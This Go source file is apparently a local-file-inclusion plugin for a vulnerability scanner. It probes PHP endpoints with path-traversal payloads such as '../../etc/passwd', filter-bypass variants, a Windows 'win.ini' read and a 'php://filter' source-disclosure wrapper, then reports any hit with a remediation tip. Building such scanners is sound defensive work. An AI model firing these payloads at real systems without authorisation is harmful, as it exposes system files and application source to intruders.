package plugins

import (
	"DORM/models"
	"fmt"
	"strings"
)

// 13. LFI (V2.1 - SMART GUESSING)
type LFIPlugin struct{}

func (p *LFIPlugin) Name() string { return "LFI (Local File Inclusion - Smart)" }

func (p *LFIPlugin) Run(target models.ScanTarget) *models.Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	client := models.GetClient()
	baseURL := getURL(target, "")

	endpoints := []string{
		"/", "/index.php", "/main.php", "/home.php", "/view.php",
		"/preview.php", "/loader.php", "/include.php", "/content.php",
	}

	params := []string{"page", "file", "view", "include", "doc", "path", "load", "content", "lang"}

	payloads := []string{
		"/etc/passwd",
		"../../../../../../../../etc/passwd",
		"....//....//....//....//etc/passwd",
		"c:\\windows\\win.ini",
		"php://filter/convert.base64-encode/resource=index.php",
	}

	for _, ep := range endpoints {
		for _, param := range params {
			for _, payload := range payloads {

				targetURL := fmt.Sprintf("%s%s?%s=%s", baseURL, ep, param, payload)

				resp, err := client.Get(targetURL)
				if err == nil {
					defer resp.Body.Close()

					buf := make([]byte, 5120)
					n, _ := resp.Body.Read(buf)
					content := string(buf[:n])

					if strings.Contains(content, "root:x:0:0") ||
						strings.Contains(content, "[fonts]") ||
						strings.Contains(content, "PD9waH") {

						return &models.Vulnerability{
							Target:      target,
							Name:        "Local File Inclusion (LFI)",
							Severity:    "CRITICAL",
							CVSS:        8.5,
							Description: fmt.Sprintf("Critical system file read successfully.\nURL: %s\nPayload: %s", targetURL, payload),
							Solution:    "Restrict file paths using a whitelist or disable dynamic file inclusion.",
							Reference:   "OWASP LFI",
						}
					}
				}
			}
		}
	}
	return nil
}
